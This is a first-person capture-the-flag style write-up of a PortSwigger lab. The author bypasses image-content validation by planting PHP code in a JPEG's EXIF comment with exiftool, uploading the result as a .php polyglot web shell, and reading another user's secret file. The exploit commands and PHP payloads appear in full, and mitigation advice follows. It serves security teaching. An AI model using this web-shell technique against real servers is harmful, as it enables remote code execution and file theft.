# Remote Code Execution via Polyglot Web Shell Upload

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability** caused by insufficient file content validation.

The application attempted to prevent malicious file uploads by verifying whether uploaded files were genuine images. Instead of relying only on file extensions, it validated the file signature and image metadata.

However, the validation mechanism contained a flaw.

By creating a **polyglot file** (a file that is both a valid image and valid PHP code), it was possible to bypass the image validation checks while still achieving PHP code execution.

This lab focused on:

- File Upload Vulnerabilities
- Polyglot Files
- Image Metadata Abuse
- EXIF Manipulation
- Web Shell Uploads
- Remote Code Execution (RCE)

---

# 🔍 What is a Polyglot File?

A **polyglot file** is a file that is valid in multiple formats simultaneously.

For example:

```text
Valid JPEG Image
+
Valid PHP Script
```

can exist inside the same file.

This allows attackers to bypass file validation checks because:

```text
Image Validator
↓
Sees Valid JPEG

PHP Interpreter
↓
Executes PHP Code
```

The file satisfies both requirements at the same time.

This technique is commonly used to bypass:

- file signature validation
- MIME type validation
- image verification checks

---

# 🎯 Objective

The goal of this lab was to:

- bypass image content validation
- create a polyglot JPEG/PHP file
- upload a malicious web shell
- execute PHP code on the server
- retrieve Carlos's secret
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(1).png?raw=true)

The application initially displayed:

- several products/pages
- a **My Account** button

---

## Screenshot 2 — Login Page

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(2).png?raw=true)

After clicking **My Account**, I landed on the login page.

The lab provided valid credentials:

```text
Username: wiener
Password: peter
```

I entered the credentials and logged in.

---

## Screenshot 3 — Avatar Upload Functionality

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(3).png?raw=true)

After successful authentication as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar Upload functionality

To verify normal upload behavior, I selected:

```text
luffy.jpg
```

and uploaded it.

---

## Screenshot 4 — Successful Image Upload

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(4).png?raw=true)

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

confirming that image uploads worked correctly.

---

## Screenshot 5 — Attempting a Direct PHP Upload

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(5).png?raw=true)

After returning to the account page, I selected:

```php
virus.php
```

containing:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

and attempted to upload it.

---

## Screenshot 6 — Upload Rejected

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(6).png?raw=true)

The application responded:

```text
Error. File is not a valid image.
Sorry, there was an error uploading your file.
```

### Why Did This Happen?

Unlike previous labs, the application was not simply checking:

```text
File Extension
```

Instead it was validating:

```text
Actual File Content
↓
Image Signature
↓
Image Metadata
```

A genuine JPEG contains specific image headers and metadata.

The uploaded PHP file contained:

```text
PHP Code Only
```

and therefore failed the image validation process.

The application essentially performed:

```text
Is this a real image?
↓
No
↓
Reject Upload
```

This meant a simple PHP upload would not work.

---

## Screenshot 7 — Inspecting the Legitimate Image

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(.).png?raw=true)

To understand why the image passed validation, I examined the JPEG using:

```bash
exiftool luffy.jpg
```

The output displayed metadata such as:

```text
File Type: JPEG
MIME Type: image/jpeg
Image Dimensions
Encoding Information
```

This confirmed that:

```text
luffy.jpg
```

was recognized as a legitimate image.

---

## Screenshot 8 — Inspecting the PHP File

![Screenshot 8](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(..).png?raw=true)

Next, I examined the PHP file:

```bash
exiftool virus.php
```

The output showed:

```text
File Type: PHP
```

which explained why the upload validation rejected it.

The application expected:

```text
JPEG
```

but received:

```text
PHP
```

---

## Screenshot 9 — Creating the Polyglot File

![Screenshot 9](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(7).png?raw=true)

To bypass the validation, I created a polyglot file using:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" luffy.jpg -o qwert.php
```

### Command Breakdown

#### Part 1

```bash
exiftool
```

Used to read and modify image metadata.

---

#### Part 2

```bash
-Comment="
...
"
```

Adds a custom comment field inside the JPEG metadata.

---

#### Part 3

```php
<?php echo 'START ' .
file_get_contents('/home/carlos/secret')
. ' END'; ?>
```

This PHP code:

```text
Reads Carlos's Secret
↓
Prints START
↓
Prints Secret
↓
Prints END
```

The markers:

```text
START
END
```

make it easier to locate the secret in the output.

---

#### Part 4

```bash
luffy.jpg
```

Source image.

---

#### Part 5

```bash
-o qwert.php
```

Creates a new file named:

```text
qwert.php
```

### Overall Logic

The idea was:

```text
Take Legitimate JPEG
↓
Inject PHP into Metadata
↓
Save As .php
↓
Bypass Image Validation
↓
Execute PHP Code
```

This produced a file that was simultaneously:

```text
Valid JPEG
+
Valid PHP
```

making it a polyglot.

---

## Screenshot 10 — Verifying the Polyglot File

![Screenshot 10](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(8).png?raw=true)

I inspected the new file:

```bash
exiftool qwert.php
```

The output showed:

```text
JPEG Metadata
Comment Field
Image Information
```

The file still looked like a valid JPEG image while now containing PHP code inside its metadata.

---

## Screenshot 11 — Uploading the Polyglot File

![Screenshot 11](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(11).png?raw=true)

I returned to the application and uploaded:

```text
qwert.php
```

Because the file still contained valid JPEG structures, it passed the application's image validation checks.

---

## Screenshot 12 — Upload Successful

![Screenshot 12](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(12).png?raw=true)

The application responded:

```text
The file avatars/qwert.php has been uploaded.
```

confirming that the polyglot file bypassed the upload restrictions.

---

## Screenshot 13 — Executing the Polyglot Web Shell

![Screenshot 13](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Remote%20Code%20Execution%20via%20Polyglot%20Web%20Shell%20Upload/screenshots/lab6(13).png?raw=true)

After returning to the account page, the avatar appeared as a broken image.

I opened the image in a new tab.

Instead of displaying an image, the server executed the embedded PHP code.

Within the page output I found:

```text
START
<secret>
END
```

The markers clearly identified Carlos's secret.

I copied the secret and submitted it through the lab banner.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

- the application trusted image validation alone
- uploaded files were executable by the server
- image metadata was not sanitized
- PHP code embedded inside metadata was not detected

The resulting logic became:

```text
Image Validator
↓
Valid JPEG

PHP Interpreter
↓
Executes Embedded PHP
```

Both systems viewed the same file differently.

---

# 💥 Impact

An attacker could potentially:

- bypass image upload restrictions
- upload web shells
- achieve Remote Code Execution
- read sensitive files
- execute arbitrary server-side code
- fully compromise the application

---

# 🛡 Mitigation

To prevent this issue:

- strip metadata from uploaded images
- re-encode images server-side
- store uploads outside the web root
- disable script execution in upload directories
- validate file contents after processing
- generate server-side filenames

Example:

```text
Upload Image
↓
Strip Metadata
↓
Re-encode Image
↓
Store Safely
↓
Serve as Static Content
```

---

# 🧠 Skills Learned

- File Upload Testing
- Polyglot File Creation
- EXIF Metadata Manipulation
- Image Validation Bypass
- Web Shell Upload Techniques
- Remote Code Execution
- ExifTool Usage

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- ExifTool
- Browser Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how image validation alone is not sufficient to secure file upload functionality.

By embedding PHP code inside JPEG metadata and creating a polyglot file, I was able to bypass the application's image validation checks while still achieving PHP execution on the server.

Through this lab, I learned:

- how polyglot files work
- how image metadata can be abused
- how EXIF comments can contain executable code
- why image validation alone is insufficient
- how file upload vulnerabilities can lead to Remote Code Execution

The lab was successfully solved by creating a JPEG/PHP polyglot file, bypassing image validation, executing server-side PHP code, and retrieving Carlos's secret.
